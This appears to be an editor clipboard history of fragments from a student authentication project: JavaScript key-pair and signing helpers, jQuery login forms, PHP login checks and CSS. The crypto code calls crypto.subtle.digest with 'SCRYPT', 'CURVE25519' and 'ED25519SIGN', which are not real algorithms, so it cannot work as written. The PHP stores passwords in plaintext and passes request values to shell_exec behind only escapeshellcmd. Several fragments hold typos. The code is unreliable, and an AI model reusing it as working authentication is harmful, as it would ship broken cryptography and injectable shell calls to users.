	async function createKeyPairFromPassword(password) {
	  const encoder = new TextEncoder();
	
	  //Get scrypt hash of password
	  const passEnc = encoder.encode(password);
	  const hashScrypt = await crypto.subtle.digest("SCRYPT", passEnc);
	  const hashArrayScrypt = Array.from(new Uint8Array(hashScrypt)); // convert buffer to byte array
	
	  //Slice scrypt hash to 32 bytes to get the privateKey
	  const privateKeyArray = hashArrayScrypt.slice(0, 32);
	  const privateKey = privateKeyArray
	    .map(b => b.toString(16).padStart(2, "0"))
	    .join("");
	
	  const privateKeyEnc = hexToBytes(privateKey);
	  const privateKeyBytes = new Uint8Array(privateKeyEnc);
	  //Curve25519 scalar mult lower 32 bytes of sha512 hash to get public key
	  const publicKeyPromise = await crypto.subtle.digest(
	    "CURVE25519",
	    privateKeyBytes
	  );
	  const publicKeyByteArray = Array.from(new Uint8Array(publicKeyPromise)); // convert buffer to byte array
	
	  const publicKey = publicKeyByteArray
	    .map(b => b.toString(16).padStart(2, "0"))
	    .join("");
	
	  // console.log("Private key: ", privateKey);
	  // console.log("Public key: ", publicKey);
	
	  return privateKey.concat(publicKey);
	}
	
0df93e34273b367bb63bad28c94c78d5|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|7|5|v|javascript
	async
4a79f76a9c27cc9b268cc7c0450017b2|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|33|1|V|javascript
	
	  // console.log("Private key: ", privateKey);
	  // console.log("Public key: ", publicKey);
96eb1edf611432f8ed6c25fce7657a39|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|46|12|V|javascript
	        createKeyPairFromPassword(password).then(
	            
5bd9a3cf4b209fdcdc9bc0473e565e16|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|46|9|V|javascript
	        );
ebebf753e38240ff101cfc7909bd6bf4|file:///home/neo/Documents/diplomatiki/javascript-files/time-signature.js|4|1|V|javascript
		let public_key = keypair.substr(64,128);
f405230fd93d13982f4c8a8509d2c8da|file:///home/neo/Documents/diplomatiki/javascript-files/time-signature.js|8|1|V|javascript
	    let postResult = Promise.resolve(
	        $.post("http://localhost:80/index.php",
	            {
	                'username': username, 
	                'public_key': public_key,
	                'message': message,
	                'signature': signature,
	            },
	            function(data){
	                // console.log(data);
	            })
	    );    
	    return postResult;
49b2eed4f6e62066f9c143c3870c19b3|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|54|13|V|javascript
	            {
	                'username': username, 
	                'public_key': public_key,
	                'message': message,
	                'signature': signature,
	            },
076c741708888b91c1314d0374985612|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|54|13|V|javascript
	            {
	                'username': username, 
	                'public_key': public_key,
	                'message': message,
	                'signature': signature,
	            },
	            function(data){
3b50089575a092553e5f1bafeb8d300f|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|53|16|v|javascript
	"http://localhost:80/index.php"
7cba7c5c509928c9619da3f8b458584e|file:///home/neo/Documents/diplomatiki/javascript-files/password-post.html|1|1|V|html
	<!DOCTYPE html>
	<html>
	<head>
	<meta content="text/html;charset=utf-8" http-equiv="Content-Type">
	<meta content="utf-8" http-equiv="encoding">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	<script type = "text/javascript" src = "/home/neo/Documents/diplomatiki/javascript-files/time-password.js"></script>
	</head>
	<body>
	  <div class="container"><b>Normal password</b></div>
	  <div class="container">
	    <label for="uname"><b>Username</b></label>
	    <input id="username" type="text" placeholder="Enter Username" name="uname" required>
	    <label for="psw"><b>Password</b></label>
	    <input id="passwd" type="password" placeholder="Enter Password" name="psw" required>
	    <button type="submit">Login</button>
	  </div>
	</body>
	</html>
49ac827de42b586c2433d6d15b143035|file:///home/neo/Documents/diplomatiki/javascript-files/auth-test.html|7|41|v|html
	/home/neo/Documents/diplomatiki/javascript-files/time-password.js
8b0b23e67382597d55dcf73c8f2298fe|file:///home/neo/Documents/diplomatiki/javascript-files/auth-test.html|10|29|v|html
	Normalpassword
9314fbd323dc6dfe87f761c71bbe44f2|file:///home/neo/Documents/diplomatiki/javascript-files/time-password.js|32|1|V|javascript
	$(document).ready(function() {
	  $("button").click(function() {
	    let password = document.getElementById("passwd").value;
	    let username = document.getElementById("username").value;
	    timePost(username, password).then(avgTime => console.log(avgTime));
	  });
	});
fe409c591e619ad8a12e8196417293fc|file:///opt/lampp/htdocs/auth-test.html|7|1|V|html
	<script type = "text/javascript" src = "auth.js"></script>
fa53b91ccc1b78668d5af58e1ed3a485|file:///opt/lampp/htdocs/auth-test.html|8|41|v|html
	auth
170068f249a9464607da33be7e15b88b|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|53|1|V|javascript
	    let postResult = Promise.resolve(
	        $.post(server,
	            postData,
	            function(data){
	                console.log(data);
	            })
	    );    
	    return postResult;
92436ccba0621530a7973fc533319908|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|45|1|V|javascript
	        postData.password = password;
d02bd791f9419c21a15b065e2074ed12|file:///home/neo/Documents/diplomatiki/javascript-files/time-signature.js|3|1|V|javascript
		let keypair = await createKeyPairFromPassword(password);
		let public_key = keypair.substr(64,128);
	    let signedMessageBytes = await signMessage(keypair, message);
	    let signedMessageArray = Array.from(new Uint8Array(signedMessageBytes));
	    let signature = signedMessageArray.map(b => b.toString(16).padStart(2, '0')).join('');
7d2abf2d0fa7c3a0c13236910f30bc43|file:///opt/lampp/htdocs/myjs.js|5|9|v|javascript
	signup
b87de23b28900bea494611f7e15006c9|file:///home/neo/Documents/diplomatiki/javascript-files/create-keypair.js|40|1|V|javascript
	async function signMessage(keypair, message) {
	  const input = keypair.concat(message);
	  // console.log("Signature input: ", input);
	  const inputBuf = hexToBytes(input);
	  const inputArray = new Uint8Array(inputBuf);
	
	  return crypto.subtle.digest("ED25519SIGN", inputArray);
	}
450c7695dbf20b676707bf5663d5def8|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|40|1|V|javascript
	  // console.log("Signature input: ", input);
a1f5f26b4f0fc7e7cc60290244310288|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|38|16|v|javascript
	signMessage
5f8274706b24511b5e3ddeb01bd573ca|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|103|1|V|javascript
	    let bytes;
	    for (bytes = [], c = 0; c < hex.length; c += 2)
	        bytes.push(parseInt(hex.substr(c, 2), 16));
	    return bytes;
	}
	
	let createKeyPairFromPassword = async function(password) {
	  const encoder = new TextEncoder();
	
	  //Get scrypt hash of password
	  const passEnc = encoder.encode(password);
	  const hashScrypt = await crypto.subtle.digest("SCRYPT", passEnc);
	  const hashArrayScrypt = Array.from(new Uint8Array(hashScrypt)); // convert buffer to byte array
	
	  //Slice scrypt hash to 32 bytes to get the privateKey
	  const privateKeyArray = hashArrayScrypt.slice(0, 32);
	  const privateKey = privateKeyArray
	    .map(b => b.toString(16).padStart(2, "0"))
	    .join("");
	
	  const privateKeyEnc = hexToBytes(privateKey);
	  const privateKeyBytes = new Uint8Array(privateKeyEnc);
	  //Curve25519 scalar mult lower 32 bytes of sha512 hash to get public key
	  const publicKeyPromise = await crypto.subtle.digest(
	    "CURVE25519",
	    privateKeyBytes
	  );
	  const publicKeyByteArray = Array.from(new Uint8Array(publicKeyPromise)); // convert buffer to byte array
	
	  const publicKey = publicKeyByteArray
	    .map(b => b.toString(16).padStart(2, "0"))
	    .join("");
	
	  return privateKey.concat(publicKey);
	}
	
	let signMessage = async function (keypair, message) {
	  const input = keypair.concat(message);
	  const inputBuf = hexToBytes(input);
	  const inputArray = new Uint8Array(inputBuf);
	  return crypto.subtle.digest("ED25519SIGN", inputArray);
	}
	
	async function signMessage(keypair, message) {
	  const input = keypair.concat(message);
	  // console.log("Signature input: ", input);
	  const inputBuf = hexToBytes(input);
	  const inputArray = new Uint8Array(inputBuf);
	
	  return crypto.subtle.digest("ED25519SIGN", inputArray);
	}
	
	async function signup(username, password, method, server){
	
	    let postData = {};
	    postData.username = username;
	    
	    if (method === "password"){
	        postData.password = password;
	    } else if (method === "keypair"){
	        let keypair = await createKeyPairFromPassword(password);
		    let public_key = keypair.substr(64,128);
	        postData.public_key = public_key;
	    } else {
	        throw("Method not supported");
	    }
	    let postResult = Promise.resolve(
	        $.post(server,
	            postData,
	            function(data){
	                console.log(data);
	            })
	    );    
	    return postResult;
	}
	
	async function authenticate(username, password, method, server, message = ""){
	    
	    let postData = {};
	    postData.username = username;
	
	    if (method === "password"){
	        postData.password = password;
	    } else if (method === "keypair"){
	        let keypair = await createKeyPairFromPassword(password);
	        let public_key = keypair.substr(64,128);
	        let signedMessageBytes = await signMessage(keypair, message);
	        let signedMessageArray = Array.from(new Uint8Array(signedMessageBytes));
	        let signature = signedMessageArray.map(b => b.toString(16).padStart(2, '0')).join('');
	
	        postData.public_key = public_key;
	        postData.signature = signature;
	    } else {
	        throw("Method not suppoerted");
	    }
	
	    let postResult = Promise.resolve(
	        $.post(server,
	            postData,
	            function(data){
	                console.log(data);
	            })
	    );    
	    return postResult;
	}
	
ce625ab2cd66b6332046065fdc4e32bd|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|44|1|V|javascript
	
	async function signMessage(keypair, message) {
	  const input = keypair.concat(message);
	  // console.log("Signature input: ", input);
	  const inputBuf = hexToBytes(input);
	  const inputArray = new Uint8Array(inputBuf);
	
	  return crypto.subtle.digest("ED25519SIGN", inputArray);
	}
ed56bb38b0304bd1c8637e4bd94d2fcd|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|50|1|V|php
	        $toCheck = $password_array["$username"];
	        if ( $output == $toCheck )
	            echo "Logged in with password";
	        else 
	            echo "Wrong password";
8ca5a8a4e31a833527294613a611cb79|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|48|9|V|php
	            p
4dcaf58a1a6fd3555d9626cfadc42510|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|5|9|v|javascript
	authenticate
71337e0141668a436dadc6f3ac8616d4|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|5|37|v|javascript
	keypair
2b10a7b3e1fed59f3e98c731a9e9a9a4|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|42|29|v|php
	$register
68934a3e9455fa72420237eb05902327|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|31|63|v|php
	false
9de4a97425678c5b1288aa70c1669a64|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|56|18|v|javascript
	register
d56b699830e77ba53855679cb1d252da|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|86|18|v|javascript
	login
26c599c5ffbcfacf97b3bb8583e4724d|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|32|5|V|php
	    $login = array_key_exists('login', $array) ? true : NULL;
3b52f713a0add08e8423dd302d486a43|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|41|13|v|php
	isset($register
a3cb886d1f7929415595ff8ab65cae99|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|49|9|V|php
	        if (isset($logi){
63a493030253ba0c410d64fe736e39a1|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|49|13|v|php
	isset
9979198940c77d09758137a3feca3a86|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|49|14|v|php
	logi
9f4912d9948ff6e64dbf635d95e50ca9|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|57|9|V|javascript
	        console.log(postData.mode);
811f9d19a0e9113d1cebc23c87bbdf6c|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|56|5|V|javascript
	        postData.mode = "register";
ebbdd068d1e247b92c4f424e84ea1ddc|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|86|9|V|javascript
	        postData.mode = "login";
8370c7f6ed5efbaa2365c3eae99cceea|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|35|5|V|php
	    echo "$mode";
e4a58af87f6aca7fd6a40180f5bb876c|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|35|5|V|php
	    /* echo "Register $register"; */
	    /* echo "Login $login"; */
3e5928f6b2bb28eb4fc8adb8867e6015|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|40|17|v|php
	in_array
bbaf782bc0edbba093ca38fcd778c4ec|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|45|17|V|php
	                echo $output;
7788ee13fac780335ee520fce3ff0075|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|39|1|V|php
	        if (strcmp($mode, "register") == 0){
	            if (array_key_exists($username, $password_array)){
	                echo "User $username already exists!";
	            } else{
	                $password_array["$username"] = $output;
	                echo "User $username registered!";
	            }
	        }
	        if (strcmp($mode, "login") == 0){
	            $toCheck = $password_array["$username"];
	            if ( $output == $toCheck )
	                echo "Logged in with password";
	            else 
	                echo "Wrong password";
	        }
	
082c3f67d064f5c4df0fbd8586e73723|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|58|46|v|php
	password_array
26bdcc5ff0830e938ad1a778dfe58046|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|62|46|v|php
	keypari
78e6221f6393d1356681db398f14ce6d|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|65|51|v|php
	output
ed3344f9cf44498dd2291c1985a21d0c|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|70|1|V|php
	            $toCheck = $password_array["$username"]kk
	            if ( $output == $toCheck )
	                echo "Logged in with password";
	            else 
	                echo "Wrong password";
973f557bfbd672421ca6d8c9c2572cfe|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|72|1|V|php
	        $command = escapeshellcmd("/usr/bin/python2.7 /opt/lampp/htdocs/verify.py $public_key $message $signature");
	        $output = shell_exec($command);
	        echo $output;
4500ad05140038a30eeaf2a450fd766a|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|56|23|v|php
	Wrong password
99b810266e4cc8d4e7e41c00d66cced8|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|75|1|V|php
	            $command = escapeshellcmd("/usr/bin/python2.7 /opt/lampp/htdocs/verify.py $public_key $message $signature");
	            $output = shell_exec($command);
	            echo $output;
145bdf838ebf9ff66fc7597d0a87138b|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|77|17|V|php
	                echo "Wrong public key"
76ab7b2dd91936707598ba242075378b|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|67|17|V|php
	                echo $public_key;
6dbf9d96da540d29ba4f424e2687452c|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|5|87|v|javascript
	af82
1282defa11176f98a1960e025321eb73|file:///home/neo/Documents/diplomatiki/javascript-files/keypair-post.html|1|1|V|html
	<!DOCTYPE html>
	<html>
	<head>
	<meta content="text/html;charset=utf-8" http-equiv="Content-Type">
	<meta content="utf-8" http-equiv="encoding">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	<script type = "text/javascript" src = "/home/neo/Documents/diplomatiki/javascript-files/create-keypair.js"></script>
	<script type = "text/javascript" src = "time-signature.js"></script>
	</head>
070c822f0992fa397c1e67bc890f8749|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|35|59|v|html
	Join us
c90c343479f2dfa52e45cfb48d529b94|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|10|1|V|html
	<div id="container_demo" >
	<!-- hidden anchor to stop jump http://www.css3create.com/Astuce-Empecher-le-scroll-avec-l-utilisation-de-target#wrap4  -->
	<a class="hiddenanchor" id="toregister"></a>
	<a class="hiddenanchor" id="tologin"></a>
	<div id="wrapper">
	    <div id="login" class="animate form">
	        <form  action="mysuperscript.php" autocomplete="on"> 
	            <h1>Log in</h1> 
	            <p> 
	                <label for="username" class="uname" data-icon="u" > Your email or username </label>
	                <input id="username" name="username" required="required" type="text" placeholder="myusername or mymail@mail.com"/>
	            </p>
	            <p> 
	                <label for="password" class="youpasswd" data-icon="p"> Your password </label>
	                <input id="password" name="password" required="required" type="password" placeholder="eg. X8df!90EO" /> 
	            </p>
	            <p class="keeplogin"> 
	                <input type="checkbox" name="loginkeeping" id="loginkeeping" value="loginkeeping" /> 
	                <label for="loginkeeping">Keep me logged in</label>
	            </p>
	            <p class="login button"> 
	                <input type="submit" value="Login" /> 
	            </p>
	            <p class="change_link">
	                Not a member yet ?
	                <a href="#toregister" class="to_register">Register</a>
	            </p>
	        </form>
	    </div>
	
	    <div id="register" class="animate form">
	        <form  action="mysuperscript.php" autocomplete="on"> 
	            <h1> Sign up </h1> 
	            <p> 
	                <label for="usernamesignup" class="uname" data-icon="u">Your username</label>
	                <input id="usernamesignup" name="usernamesignup" required="required" type="text" placeholder="mysuperusername690" />
	            </p>
	            <p> 
	                <label for="emailsignup" class="youmail" data-icon="e" > Your email</label>
	                <input id="emailsignup" name="emailsignup" required="required" type="email" placeholder="mysupermail@mail.com"/> 
	            </p>
	            <p> 
	                <label for="passwordsignup" class="youpasswd" data-icon="p">Your password </label>
	                <input id="passwordsignup" name="passwordsignup" required="required" type="password" placeholder="eg. X8df!90EO"/>
	            </p>
	            <p> 
	                <label for="passwordsignup_confirm" class="youpasswd" data-icon="p">Please confirm your password </label>
	                <input id="passwordsignup_confirm" name="passwordsignup_confirm" required="required" type="password" placeholder="eg. X8df!90EO"/>
	            </p>
	            <p class="signin button"> 
	                <input type="submit" value="Sign up"/> 
	            </p>
	            <p class="change_link">  
	                Already a member ?
	                <a href="#tologin" class="to_register"> Go and log in </a>
	            </p>
	        </form>
	    </div>
	</div>
	</div>  
df750bbc2267a0b8414fd4af3a1a8bf0|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|8|1|V|html
	<script type = "text/javascript" src = "time-signature.js"></script>
106a6c241b8797f52e1e77317b96a201|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|7|42|v|html
	home
59e6f302c60b2f76164c857554679b94|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|7|41|v|html
	//neo/Documents/diplomatiki/javascript-files/create-keypair.js
f961b1b1cdfab9a8064104e987d15004|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|7|1|V|html
	<script type = "text/javascript" src = "create-keypair.js"></script>
d24b03aed0561332e109d6fbf87ccba0|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|8|41|v|html
	create-keypair
37d30e2cc0143feb7fcf501f64174b9d|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|9|46|v|html
	mystyle
f37776fcbfbee95fee0dd3bde2fc04cd|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|33|37|V|html
	            <div class="field-wrap">
	              <label>
	                Last Name<span class="req">*</span>
	              </label>
	              <input type="text"required autocomplete="off"/>
	            </div>
	          </div>
	
	          <div class="field-wrap">
	            <label>
	              Email Address<span class="req">*</span>
	            </label>
	            <input type="email"required autocomplete="off"/>
	          </div>
41b394758330c83757856aa482c79977|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|33|10|V|html
	          
bc910f8bdf70f29374f496f05be0330c|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|28|17|v|html
	First Name
69b7723b691867cd2c3eed3cb2192894|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|30|57|v|html
	autocomplete="off" 
454133bff884cdf656aeea15f21becc4|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|35|15|v|html
	Set A 
e0c4332e8c13be976552a059f106354f|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|40|62|v|html
	Get Started
a127fd1f86e4ab650f2216f09992afa4|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|13|6|V|html
	      
3ffb79b36e034b28333357da3b313dbb|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|9|1|V|html
	<link rel="stylesheet" type="text/css" href="demo.css">
e59d0acb8a20eb419080b99c2b1d8565|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|27|1|V|html
	<div class="form">
	      <ul class="tab-group">
	        <li class="tab active"><a href="#signup">Sign Up</a></li>
	        <li class="tab"><a href="#login">Log In</a></li>
	      </ul>
	      
	      <div class="tab-content">
	        <div id="signup">   
	          <h1>Sign Up for Free</h1>
	          
	          <form action="/" method="post">
	          
	          <div class="top-row">
	            <div class="field-wrap">
	              <label>
	                Username<span class="req">*</span>
	              </label>
	              <input id="username" type="text" required/>
	            </div>
	        
	          <div class="field-wrap">
	            <label>
	              Password<span class="req">*</span>
	            </label>
	            <input id="passwd" type="password"required autocomplete="off"/>
	          </div>
	          
	          <button type="submit" class="button button-block"/>Register</button>
	          
	          </form>
	
	        </div>
	        
	        <div id="login">   
	          <h1>Welcome Back!</h1>
	          
	          <form action="/" method="post">
	          
	            <div class="field-wrap">
	            <label>
	              Email Address<span class="req">*</span>
	            </label>
	            <input type="email"required autocomplete="off"/>
	          </div>
	          
	          <div class="field-wrap">
	            <label>
	              Password<span class="req">*</span>
	            </label>
	            <input type="password"required autocomplete="off"/>
	          </div>
	          
	          <p class="forgot"><a href="#">Forgot Password?</a></p>
	          
	          <button class="button button-block"/>Log In</button>
	          
	          </form>
	
	        </div>
	        
	      </div><!-- tab-content -->
	</div> <!-- /form -->
99dfb548672c11c6723e973deb70b16e|file:///home/neo/Documents/diplomatiki/javascript-files/demo.css|1|1|V|css
	@import "compass/css3";
	
	$body-bg: #c1bdba;
	$form-bg: #13232f;
	$white: #ffffff;
	
	$main: #1ab188;
	$main-light: lighten($main,5%);
	$main-dark: darken($main,5%);
	
	$gray-light: #a0b3b0;
	$gray: #ddd;
	
	$thin: 300;
	$normal: 400;
	$bold: 600;
	$br: 4px;
	
	*, *:before, *:after {
	  box-sizing: border-box;
	}
	
	html {
		overflow-y: scroll; 
	}
	
	body {
	  background:$body-bg;
	  font-family: 'Titillium Web', sans-serif;
	}
	
	a {
	  text-decoration:none;
	  color:$main;
	  transition:.5s ease;
	  &:hover {
	    color:$main-dark;
	  }
	}
	
	.form {
	  background:rgba($form-bg,.9);
	  padding: 40px;
	  max-width:600px;
	  margin:40px auto;
	  border-radius:$br;
	  box-shadow:0 4px 10px 4px rgba($form-bg,.3);
	}
	
	.tab-group {
	  list-style:none;
	  padding:0;
	  margin:0 0 40px 0;
	  &:after {
	    content: "";
	    display: table;
	    clear: both;
	  }
	  li a {
	    display:block;
	    text-decoration:none;
	    padding:15px;
	    background:rgba($gray-light,.25);
	    color:$gray-light;
	    font-size:20px;
	    float:left;
	    width:50%;
	    text-align:center;
	    cursor:pointer;
	    transition:.5s ease;
	    &:hover {
	      background:$main-dark;
	      color:$white;
	    }
	  }
	  .active a {
	    background:$main;
	    color:$white;
	  }
	}
	
	.tab-content > div:last-child {
	  display:none;
	}
	
	
	h1 {
	  text-align:center;
	  color:$white;
	  font-weight:$thin;
	  margin:0 0 40px;
	}
	
	label {
	  position:absolute;
	  transform:translateY(6px);
	  left:13px;
	  color:rgba($white,.5);
	  transition:all 0.25s ease;
	  -webkit-backface-visibility: hidden;
	  pointer-events: none;
	  font-size:22px;
	  .req {
	  	margin:2px;
	  	color:$main;
	  }
	}
	
	label.active {
	  transform:translateY(50px);
	  left:2px;
	  font-size:14px;
	  .req {
	    opacity:0;
	  }
	}
	
	label.highlight {
		color:$white;
	}
	
	input, textarea {
	  font-size:22px;
	  display:block;
	  width:100%;
	  height:100%;
	  padding:5px 10px;
	  background:none;
	  background-image:none;
	  border:1px solid $gray-light;
	  color:$white;
	  border-radius:0;
	  transition:border-color .25s ease, box-shadow .25s ease;
	  &:focus {
			outline:0;
			border-color:$main;
	  }
	}
	
	textarea {
	  border:2px solid $gray-light;
	  resize: vertical;
	}
	
	.field-wrap {
	  position:relative;
	  margin-bottom:40px;
	}
	
	.top-row {
	  &:after {
	    content: "";
	    display: table;
	    clear: both;
	  }
	
	  > div {
	    float:left;
	    width:48%;
	    margin-right:4%;
	    &:last-child { 
	      margin:0;
	    }
	  }
	}
	
	.button {
	  border:0;
	  outline:none;
	  border-radius:0;
	  padding:15px 0;
	  font-size:2rem;
	  font-weight:$bold;
	  text-transform:uppercase;
	  letter-spacing:.1em;
	  background:$main;
	  color:$white;
	  transition:all.5s ease;
	  -webkit-appearance: none;
	  &:hover, &:focus {
	    background:$main-dark;
	  }
	}
	
	.button-block {
	  display:block;
	  width:100%;
	}
	
	.forgot {
	  margin-top:-20px;
	  text-align:right;
	}
bf4112e1fe2e17ff0d89a15bca5a1fc8|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|25|28|v|html
	Already Member ? Sign In Now..
6b0369f6ea07ee23c9f1bae218a64d15|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|9|1|V|html
	<script type = "text/javascript" src = "demo.js"></script>
a4e5eb7540880e6ce8afd5911cf11029|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|20|3|V|html
	  <input type="email" placeholder="Email" required>
4d9fc7b73322e0a6718eada5bbd71d27|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|21|3|V|html
	  <input type="password" placeholder="Re Password" required>
ce50a09343724eb82df11390e2c1de18|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|2|8|v|javascript
	button
2bda2998d9b0ee197da142a0447f6725|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|5|87|v|javascript
	wrong
e66a124f9cabd3198d84dd68c8c87cf7|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|22|13|v|html
	cars
3df7453748507d4ea82277d2d0420de5|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|23|18|v|html
	volvo
717f274ee66f8541a3031f175f615e72|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|23|28|v|html
	Volvo
6601078a3503c5b39f2aee8d23d27e7f|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|24|3|V|html
	  <option value="saab">Saab</option>
38efa13690e1cef236604c0760a146f1|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|24|3|V|html
	  <option value="mercedes">Mercedes</option>
4d9fa555e7c23996e99f1fb0e286aea8|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|24|18|v|html
	audi
92b457e4c4f13dbadc66ea88e2bfb3d9|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|24|27|v|html
	Audi
d70bd30a7a30f0a2701083443d88b696|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|22|1|V|html
	<select id="method">
	  <option value="password">Register with password</option>
	  <option value="keypair">Register with key pair</option>
	</select>
0ba7583639a274c434bbe6ef797115a4|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|17|28|v|html
	Register
14ac5f79e341071e459fe3ab9559b424|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|2|1|V|javascript
	    $("#loginbtn").click(function() {
	        let password = document.getElementById("passwd").value;
	        let username = document.getElementById("username").value;
	        let method = document.getElementById("method").value;
	        authenticate(username, password, method, "http://localhost:80/index.php", "af82");
	  });
0c67efb066853046db3b18d93d303284|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|8|9|v|javascript
	loginbtn
13fe97e87589ce1b2f06ead5f8f5d2d2|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|12|75|v|javascript
	, "af82"
24367bb7fec5be6fd72e00ac1b53cfe9|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|9|1|V|javascript
	    $("#registerbtn").click(function() {
	        let password = document.getElementById("passwd").value;
	        let username = document.getElementById("username").value;
	        let method = document.getElementById("method").value;
	        signup(username, password, method, "http://localhost:80/index.php");
	  });
4ef257f30f8a9e895b95d5820be5e909|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|10|9|V|javascript
	        authenticate(username, password, method, "http://localhost:80/index.php", "af82");
3fcdb73d36d54f2cc22d0f68e6b6e182|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|13|2|v|html
	form
b8524e86e9529132abf7c295c2e50506|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|13|6|v|html
	id='login-form' action="" method='post'
81fa23b928ebb496b12209b1514a4d49|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|23|2|v|html
	form id='register-form' action="" method='post'
734d70e5416d7f7547565ea6acea06c2|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|13|23|v|html
	action="" method='post'
272d7978619c1b14a6d44456f113deb1|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|23|25|v|html
	 action="" method='post'
5dc51896299d750aa50400816bd4b16a|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|7|9|V|javascript
	        alert(this.id);
da685a29fbf9d752cf2db70a2557b8df|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|3|9|V|javascript
	        console.log("login");
a8affc088cbca89fa20dbd98c91362e4|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|2|22|v|javascript
	click
a0920839a9d9dd4926251d88d833608a|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|2|5|V|javascript
	    $("#login-form").submit(function() {
7b67871805da329e615795ee3f93c07a|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|3|9|V|javascript
	        console.log("test");
2f18e32bcb83960c925e03e8c7adb9ef|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|2|5|V|javascript
	    $("button")
241f34a44a73b654663e8d942de836f8|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|6|9|V|javascript
	        if (this.id === "login-form"){
e9ae0dec979a903625a88f235b510ec0|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|6|13|V|javascript
	            console.log("test");
4e1ddba1c31545ee09fb38ae1fd79346|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|7|9|V|javascript
	        }
fef39d4a4c90327bb67bb605a4d29bd4|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|7|9|V|javascript
	        passw
0514226eec2500d85f2d91a04aff3a7d|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|9|1|V|javascript
	        // let password = document.getElementById("passwd").value;
